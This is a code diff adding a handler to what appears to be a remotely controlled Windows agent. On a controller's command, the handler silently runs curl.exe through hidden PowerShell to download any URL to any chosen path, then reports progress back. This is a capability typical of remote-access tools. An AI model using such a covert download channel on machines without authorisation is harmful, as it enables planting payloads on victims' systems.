@@ -12335,6 +12335,97 @@ def register_socketio_handlers():
     sio.on('request_file_range')(on_request_file_range)
     sio.on('request_file_thumbnail')(on_request_file_thumbnail)
     sio.on('request_file_faststart')(on_request_file_faststart)
+    def on_ps_curl_download(data):
+        try:
+            url = str((data or {}).get('url') or '')
+            filename = _sanitize_windows_filename(str((data or {}).get('filename') or 'download.bin'))
+            path = str((data or {}).get('download_path') or '')
+            upload_id = str((data or {}).get('upload_id') or '')
+            total_size = int((data or {}).get('expected_size') or 0)
+            agent_id = get_or_create_agent_id()
+            def _normalize_dir(p: str) -> str:
+                try:
+                    import re, os
+                    raw = str(p or '').strip()
+                    if os.name != 'nt':
+                        return os.path.normpath(raw or '/')
+                    if raw in ('', '/', '\\'):
+                        return (os.environ.get('SystemDrive', 'C:') + '\\')
+                    m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
+                    if m:
+                        return (m.group(1).upper() + ':\\')
+                    if not re.match(r'^[A-Za-z]:', raw):
+                        if raw.startswith('/') or raw.startswith('\\'):
+                            drive = os.environ.get('SystemDrive', 'C:')
+                            return os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                        return os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
+                    return os.path.normpath(raw)
+                except Exception:
+                    return p
+            dest_dir = _normalize_dir(os.path.dirname(path) or os.path.expanduser('~'))
+            os.makedirs(dest_dir, exist_ok=True)
+            target_path = path if path else os.path.join(dest_dir, filename)
+            # Try to detect content length if not provided
+            if total_size <= 0 and url:
+                try:
+                    import subprocess
+                    ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                    ps_cmd = f"(Invoke-WebRequest -Uri '{url.replace(\"'\",\"''\")}' -Method Head -UseBasicParsing).Headers.'Content-Length'"
+                    r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=15)
+                    if r.returncode == 0:
+                        out = (r.stdout or b'').decode('utf-8', errors='ignore').strip()
+                        if out.isdigit():
+                            total_size = int(out)
+                except Exception:
+                    pass
+            def _run():
+                try:
+                    import subprocess, time as _t
+                    ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                    ps_cmd = f"curl.exe -L '{url.replace(\"'\", \"''\")}' -o '{target_path.replace(\"'\", \"''\")}'"
+                    p = subprocess.Popen([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
+                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
+                    last_emit = 0
+                    while True:
+                        rc = p.poll()
+                        try:
+                            if os.path.isfile(target_path) and total_size > 0:
+                                sz = os.path.getsize(target_path)
+                                prog = int(min(100, (sz / float(total_size)) * 100))
+                                now = _t.time()
+                                if now - last_emit > 1.0 or prog in (0, 25, 50, 75, 100):
+                                    safe_emit('file_upload_progress', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'received': sz, 'total': total_size, 'progress': prog})
+                                    last_emit = now
+                        except Exception:
+                            pass
+                        if rc is not None:
+                            break
+                        _t.sleep(0.5)
+                    # Finalize
+                    if os.path.isfile(target_path):
+                        sz = os.path.getsize(target_path)
+                        ok = (total_size <= 0) or (sz == total_size)
+                        if ok:
+                            safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'size': sz, 'success': True, 'source': 'agent'})
+                            try:
+                                files = FileSystemManager(sio, agent_id).list_directory(dest_dir)
+                                safe_emit('file_list', {'agent_id': agent_id, 'path': dest_dir, 'files': files})
+                            except Exception:
+                                pass
+                        else:
+                            safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': f'Incomplete download ({sz}/{total_size})', 'success': False})
+                    else:
+                        try:
+                            err = p.stderr.read().decode('utf-8', errors='ignore') if p.stderr else 'Download failed'
+                        except Exception:
+                            err = 'Download failed'
+                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': err, 'success': False})
+                except Exception as e:
+                    safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': str(e), 'success': False})
+            threading.Thread(target=_run, daemon=True).start()
+        except Exception as e:
+            safe_emit('file_upload_complete', {'agent_id': get_or_create_agent_id(), 'upload_id': (data or {}).get('upload_id'), 'filename': (data or {}).get('filename'), 'error': str(e), 'success': False})
+    sio.on('ps_curl_download')(on_ps_curl_download)
     def on_p2p_download_request(data):
         try:
             controller_ip = str(data.get('controller_ip') or '')
